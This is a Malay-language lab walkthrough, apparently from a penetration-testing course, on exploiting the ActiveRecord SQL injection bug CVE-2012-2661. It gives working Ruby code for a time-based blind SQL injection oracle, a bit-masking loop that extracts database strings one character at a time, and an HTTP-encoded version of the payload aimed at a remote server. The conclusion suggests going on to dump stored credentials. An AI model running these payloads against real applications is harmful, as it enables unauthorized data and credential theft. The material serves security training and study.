SQL injection bug (CVE-2012-2661)

Intro:
Memperincikan eksploitasi yang berlaku pada SQL injection bug (CVE-2012-2661).
Penyerang boleh menggunakan pepijat ini untuk membuang maklumat daripada pangkalan data.
Kerentanan ini sukar untuk dieksploitasi, tetapi kita akan melihat bagaimana ia boleh dilakukan.
Latihan ini dilihat sebagai lebih daripada sekadar cara menggunakan eksploitasi,
ia harus dilihat sebagai cara umum untuk mencari kelemahan,
dan bagaimana penyerang boleh bergerak dari pepijat ke arah mengeksploitasi.


Pepijat ini pada mulanya ditemui pada 1 Jun 2012, oleh Ben Murphy. 
Ia dilaporkan oleh Aaron Patterson (kumpulan Google Ruby on Rails: Security.)


The bug

Pepijat datang daripada ralat dalam cara ActiveRecord mengendalikan parameter.
Di mana penggunaan biasa ActiveRecord kelihatan seperti:

> User.where(:id => 1).all
=> [#<User id: 1, login: "admin", password: "8efe310f9ab3efeae8d410a8e0166eb2", email: "admin@", info: "wrong email address">]


Anda boleh menukar ActiveRecord dengan menyediakan parameter berniat jahat:

> User.where(:id => {:id => 1}).all
ActiveRecord::StatementInvalid: Mysql2::Error: Unknown column 'id.id' in 'where clause': SELECT `users`.* FROM `users`  WHERE `id`.`id` = 1


Kod di atas tidak berbahaya, tetapi ada kemungkinan untuk membina cincang tersuai yang membolehkan
sesuatu maklumat dibuang daripada pangkalan data dan ia boleh dilakukan.


Exploiting the bug locally
Methodology

Pepijat ini amat sukar untuk difahami dan dieksploitasi, jadi daripada mengbina dari jauh (melalui HTTP),
ia boleh dilakukan secara depan mata.
Kemudian ia akan "terjemahkan" eksploitasi kepada HTTP. Dengan cara itu dapat mengelakkan sebarang
kesilapan pengekodan dan meningkatkan produktiviti.

Proses eksploitasi dilakukan secara depan mata dengan menggunaka pelayan HTTP adalah cara yang baik untuk
mempunyai akses penuh kepada maklumat nyahpepijat dan mempercepatkan pembangunanya.

To start working, we need an example of vulnerable code
(this code is present in the shell.rb file in the home of the default user):

# Include the vulnerable library
require 'active_record'

# Connect to the database

ActiveRecord::Base.establish_connection(
      :adapter  => "mysql2",
      :host     => "localhost",
      :username => "pentesterlab",
      :password => "pentesterlab",
      :database => "pentesterlab"
    )
 
# Create a dummy class to map the users' table
class User < ActiveRecord::Base
end

# Start a Ruby shell
require 'irb'
IRB.start()


Poking around
Melalui pemerhatian, kita boleh mendapatkan pemahaman tentang aliran parameter hasad kita:

Panggilan biasa kelihatan seperti ini:

> User.where(:id =>1).all
=> [#<User id: 1, login: "admin", password: "8efe310f9ab3efeae8d410a8e0166eb2", email: "admin@", info: "wrong email address">]

Daripada ini, kita dapat melihat bahawa kod berikut mengembalikan perkara yang sama (kerana pengguna ialah:nama jadual):

> User.where(:id => {'users.id' => 1} ).all
=> [#<User id: 1, login: "admin", password: "8efe310f9ab3efeae8d410a8e0166eb2", email: "admin@", info: "wrong email address">]


Automation
----------

Kami kini akan mengautomasikan eksploitasi tempatan, untuk melakukan itu kami akan mencipta ujian fungsi yang akan mengembalikan benar atau salah berdasarkan tempoh
permintaan itu.

Oleh kerana kita tidak mahu skripnya crash, kita perlu menangkap pengecualian yang dibuat oleh ActiveRecord 

def test(sql)
  begin
    t =  Time.now 
    User.where(:id => {'information_schema where ('+sql+') or sleep(1/10)  /*'+Time.now.to_f.to_s+'*/; -- .user' => {'id' => '1'}}).all
    
  rescue ActiveRecord::StatementInvalid
    return Time.now - t < 1
  end
end

Sekarang setelah fungsi ini ditulis, kami boleh mengujinya menggunakan pilih 0 dan pilih 1 untuk memastikan semuanya berfungsi dengan lancar:

puts "test('select 0') returns #{test('select 0')}"
puts "test('select 1') returns #{test('select 1')}"

Sekarang, kita kembali kepada eksploitasi Blind SQL inejction 
Kami mempunyai 2 keadaan benar(true) dan salah(fals), berdasarkan ini, kami akan mendapatkan maklumat
Di sini kami ingin mendapatkan semula versi database dengan select @@version 
Untuk melakukan ini, kita perlu dump setiap byte setiap character, daripada query select @@version 
Katakan versinya ialah 5.0.4, kita perlu memilih semua aksara rentetan ini, satu demi satu, menggunakan fungsi substring SQL


Statement                    	Result
`substring('5.0.4',1,1)` 	     `5`
`substring('5.0.4',2,1)` 	     `.`
`substring('5.0.4',3,1)` 	     `0`
`substring('5.0.4',1,3)` 	    `5.0

Memandangkan kita tahu cara mengekstrak setiap huruf (byte), kita kini perlu mengekstrak setiap bit setiap byte
Mari lihat bagaimana kita boleh melakukannya dengan nilai 5

Mula-mula kita perlu mendapatkan nilai ASCII 5, menggunakan fungsi MySQL asci
mysql> SELECT ascii('5');
+----------+
| ascii(5) |
+----------+
|       53 |
+----------+

Sekarang kita perlu mendapatkan semula setiap bit nilai ini
53 boleh diwakili oleh binary value 00110101. Sekarang kita akan menggunakan bit-masking untuk mengasingkan setiap bit daripada yang lain.

Selepas mengasingkan dan mendapatkan semula setiap bit, kami akan dapat membina semula nilai pada bahagian penyerang.

Mula-mula, mari kita ingat bagaimana & berfungsi:

| & |	0 |	1 |
| 0 |	0 |	0 |
| 1 |	0 |	1 |

Kami akan menggunakan sifat ini untuk mengasingkan setiap bit maklumat.

>>> gambar 1 <<< 

Nilai yang dikembalikan untuk bit pertama ialah 1. Nilai ini akan menghasilkan keadaan benar(true) dan tindak balas akan cepat.
"&" digunakan untuk menutup dan 1 digunakan untuk memilih bit pertama.

As a side note: 2^0 is equal to 1.

Kita kemudian boleh beralih ke bit kedua dengan menggunakan &2 (2^1 is equal to 2):

>>> gambar 2 <<< 

Nilai yang dikembalikan untuk bit kedua ialah 0, 0 akan menghasilkan keadaan palsu(false) dan respons akan ditangguhkan.
Kita boleh meneruskan dan mendapatkan bit ketiga menggunakan &4 (2^2 is equal to 4):

>>> gambar 3 <<<

Nilai yang dikembalikan untuk bit pertama ialah 4. Nilai 4 akan menghasilkan keadaan benar(true) dan tindak balas akan cepat
Dan kita boleh terus membuang semua serpihan huruf pertama
Untuk setiap bit, anda perlu menambah nilai pada variable yang akan mengandungi huruf yang anda inginkan selepas anda mendapatkan semula semua bit.

Sekarang kita boleh meletakkan semuanya bersama dalam 2 loops, satu untuk setiap character dan satu untuk setiap bit semasa:

inj = "select @@version"
str = ""

# dummy initialisation for the while loop
value = 1
i = 0

# we loop until the returned value is null
while value != 0 
  # i is the position in the string
  i+=1
  # initialise to 0 the value we are trying to retrieve
  value = 0
  # for each bit
  0.upto(6) do |bit| 
    # 2**bit is 2^bit and will do all the bit masking work 
    sql = "select ascii(substring((#{inj}),#{i},1))&#{2**bit}"
    if test(sql)
      # if the returned value is true
      # we add the mask to the current_value
      value+=2**bit
    end
  end
  # value is an ascii value, we get the corresponding character
  # using the `.chr` ruby function 
  str+= value.chr
  puts str
end

=====================================================================================================================================================================

Exploiting the bug remotely
-----------------------------
Memandangkan kita mempunyai skrip yang berfungsi secara tempatan, kita boleh "terjemah" ke HTTP dan membuat versi yang berfungsi untuk mengatasi pelayar jauh.
Untuk melakukan itu, kita perlu mengekodkan muatan untuk memastikan bahawa apa yang dihantar adalah betul.
Pertama, kita perlu mengekod hash untuk memastikan aplikasi akan menerimanya dengan betul.
URL semasa kelihatan seperti : ?id=1 dan bahagian belakang yang menerima nilai id adalah sebagai String.
Kita perlu id untuk menjadi hash, jadi untuk melakukannya kami akan menggunakan pengekodan URL berikut id[]=value. Tetapi kita perlukan id menjadi hash yang mengandungi hash lain, untuk ini kita akan gunakan id[][]=value
Sebagai contoh, jika kita ingin menghantar yang berikut {'a' => {'b' => 'c'}} sebagai parameter bernama id, kita perlu mengakses URL dengan parameter id[a][b]=c
Sekarang kita perlu menterjemah muatan penuh kita kepada HTTP, sebagai peringatan, pertanyaan asal lambat akan kelihatan seperti:
:id => {'information_schema where (select 0) or sleep(1/10) /*1338976181.408279*/ ; -- .user' => {'id' => '1'}}
Kita boleh menterjemahkannya kepada parameter HTTP berikut:
id[information_schema%20where%20+(select+0)+or+sleep(1)%20/*1338976181408279*/%3b%20--%20.user][1]=1
Sekarang kita perlu mengekod semua aksara istimewa:
•	; perlu dikodkan, kita boleh gunakan %3b
•	& perlu dikodkan, kita boleh gunakan %26
•	= perlu dikodkan, kita boleh gunakan %3d
•	    perlu dikodkan, kita boleh gunakan + atau %20
Sekiranya kita tidak dapat hasil yang diharapkan semasa memindahkan ke HTTP, terdapat kemungkinan besar yang kita tidak mengekod sesuatu dengan betul.
Untuk melaksanakan semua perubahan ini, kita hanya perlu mengubahsuai fungsi test untuk menambahkan komponen HTTP:
require 'net/http'
def test(sql)
  begin
    
    t = Time.now 
    # mengekod hash
    inj = "?id[information_schema%20where%20+("

    # mengubah penyata sql untuk membuang askara istimewa yang telah dikodkan
    
    inj += sql.gsub(' ','+').gsub('&', "%26").gsub('=','%3d')
    
    # menambah penyata magic sleep
    inj += ")+or+sleep(1/10)%20"

    # pastikan ';' dikodkan kepada %3b 
    inj += "/*"+Time.now.to_f.to_s.gsub('.','')+"*/%3b%20--%20.user][1]=1"
  
    # semua kod HTTP yang berkaitan : cipta URL dan lakukan permintaan
    uri = URI.parse("http://vulnerable/"+inj)
    
    http = Net::HTTP.new(uri.host, uri.port)
    begin
      response = http.request(Net::HTTP::Get.new(uri.request_uri))
      response = Net::HTTP.get_response(uri) 

      # rescue jika berlaku sebarang error
      # berkemungkinan akan berlaku dengan time based exploitation
    rescue Errno::ECONNRESET, EOFError
    end

    # kita return masa yang diambil oleh request

    return Time.now - t < 1
  end
end

Jika anda mengujinya di laman web di Internet, anda mungkin perlu melaraskan talian return Time.now - t < 1 untuk menentang kelewatan rangkaian.


Conclusion
----------
Latihan ini menunjukkan cara untuk kita mengeksploitasi ActiveRecord SQL Injection (aka CVE-2012-2661) bug.
Kami harap kursus ini memberi kita pemahaman yang lebih mendalam bagaimana cara kelemahan ini berfungsi, dan bagaimana kita boleh menggunakan pengetahuan ini untuk mencipta eksploitasi yang berfungsi.
Untuk pergi lebih mendalam, anda boleh mula membuang bukti kelayakan yang tersedia dalam pangkalan data.
